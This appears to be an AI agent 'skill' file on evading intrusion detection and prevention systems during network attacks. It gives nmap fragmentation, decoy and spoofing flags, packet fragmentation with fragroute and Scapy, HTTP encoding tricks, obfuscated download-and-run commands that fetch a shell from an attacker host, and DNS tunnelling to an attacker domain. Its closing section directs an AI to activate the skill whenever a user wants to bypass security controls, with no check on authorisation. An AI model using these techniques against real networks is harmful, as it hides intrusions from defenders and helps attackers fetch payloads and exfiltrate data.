# IDS/IPS Evasion Skill

## Goal

Bypass Intrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS) to avoid detection during network attacks and reconnaissance.

## Methodology

1. **Identify Security Controls**: Determine IDS/IPS presence
2. **Understand Detection**: Know what triggers alerts
3. **Apply Evasion Techniques**: Modify attack traffic
4. **Test Detection**: Validate bypass success
5. **Adapt**: Modify techniques based on results

## Detection Types

- **Signature-based**: Matches known attack patterns
- **Anomaly-based**: Detects unusual behavior
- **Heuristic**: Uses rules and algorithms
- **Behavioral**: Analyzes traffic patterns

## Nmap Evasion Techniques

```bash
# Fragment packets
nmap -f target
nmap --mtu 8 target

# Decoy scan
nmap -D RND:10 target
nmap -D decoy1,decoy2,ME target

# Idle/Zombie scan
nmap -sI zombie_host target

# Timing options (slow down)
nmap -T0 target  # Paranoid
nmap -T1 target  # Sneaky
nmap -T2 target  # Polite

# Custom timing
nmap --scan-delay 5s target
nmap --max-rate 10 target

# Source port manipulation
nmap --source-port 53 target
nmap --source-port 80 target

# Data length padding
nmap --data-length 25 target

# Bad checksum (test IDS)
nmap --badsum target

# TTL manipulation
nmap --ttl 55 target

# Custom MAC
nmap --spoof-mac 0 target  # Random
nmap --spoof-mac Dell target

# Combined evasion
nmap -f --mtu 8 -T2 --source-port 53 --data-length 25 -D RND:5 target
```

## Packet Fragmentation

```bash
# Using fragroute
fragroute target

# fragroute.conf example:
ip_frag 8
ip_chaff dup
order random
print

# Using Scapy
from scapy.all import *
# Create fragmented packets
frags = fragment(IP(dst="target")/TCP(dport=80), fragsize=8)
```

## Protocol Manipulation

```bash
# HTTP evasion
# Different encodings:
%2e%2e%2f = ../
%252e%252e%252f = ../ (double encoding)
/./././path = /path (path normalization)

# Case manipulation
GET /Admin vs GET /ADMIN vs GET /admin

# Unicode/UTF-8 encoding
%c0%af = / (overlong encoding)

# Add null bytes
file%00.php

# Request splitting/smuggling
# See web skills for HTTP smuggling
```

## Payload Obfuscation

```bash
# Base64 encoding
echo "id" | base64
# Execute: echo "aWQ=" | base64 -d | bash

# XOR encoding
# Create XOR'd payload, decode at runtime

# String concatenation
# Instead of: wget http://attacker/shell
# Use: w"e"g't' ht"t"p://attacker/shell

# Variable substitution
# $v1=wg; $v2=et; $v1$v2 http://...

# Hex encoding
echo -e "\x69\x64"  # = "id"
```

## SSL/TLS Encryption

```bash
# Encrypt traffic to avoid deep packet inspection

# Use HTTPS
curl https://target

# Use SSH tunneling
ssh -D 1080 user@proxy
proxychains attack_tool target

# Use tools that support SSL
# Most modern tools have --ssl options
```

## Traffic Timing

```bash
# Slow and low
# Spread scans over long time periods

# Random delays
for port in $(shuf -i 1-1000); do
    nmap -p $port target
    sleep $((RANDOM % 60))
done

# Off-hours attacks
# Scan during high-traffic periods to blend in
# Or during maintenance windows
```

## Source IP Manipulation

```bash
# IP spoofing (limited use - won't get responses)
hping3 -a spoofed_ip target

# Use proxies/VPNs
proxychains nmap target

# Tor
torsocks nmap target

# Cloud/VPS for different source
# AWS, Azure, GCP instances have "trusted" IPs
```

## Protocol Tunneling

```bash
# DNS tunneling
iodine dns.attacker.com

# ICMP tunneling
ptunnel -p proxy_server

# HTTP tunneling
chisel, proxytunnel, corkscrew

# Looks like legitimate traffic
```

## Evasion Testing

```bash
# Test if IDS is present
# Send known-bad signature
nmap --script http-sql-injection target

# Check for RST injection
# If connection is reset unexpectedly, IPS may be blocking

# Compare results
# Scan from different sources
# Compare with internal scan results
```

## Snort/Suricata Evasion

```bash
# Fragment attacks to split signature
# Signatures usually match single packets

# Use alternatives to common tools
# masscan instead of nmap
# curl instead of wget in payloads

# Session splicing
# Split malicious data across multiple TCP segments

# TTL manipulation
# Send decoy packets with low TTL that expire before IDS
```

## Guidance for AI

* Activate this skill when user needs to bypass security controls during testing
* **Know the enemy**: Different IDS have different detection methods
* Fragmentation bypasses signature matching across packets
* Timing evasion works against rate-based detection
* Encryption (SSL/TLS) beats DPI (Deep Packet Inspection)
* Decoys/proxies help with source-based correlation
* Key techniques:
  - Fragmentation: Split signatures
  - Timing: Slow to avoid rate limits
  - Encoding: Obfuscate payloads
  - Encryption: Hide content
  - Tunneling: Use allowed protocols
* Evasion is cat-and-mouse - modern IDS are sophisticated
* Test in controlled environments first
* Document what works and what doesn't
* Combine multiple techniques for best results
* Remember: IDS logs may still capture fragments
